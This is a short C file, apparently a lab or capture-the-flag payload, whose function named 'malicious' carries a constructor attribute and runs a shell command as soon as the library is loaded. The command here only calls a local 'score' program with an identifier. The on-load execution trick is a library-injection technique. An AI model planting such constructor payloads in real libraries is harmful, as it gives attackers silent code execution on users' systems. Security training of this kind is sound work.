#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score b7af52b5-cc47-46b7-a844-94d5e60dd355");
}

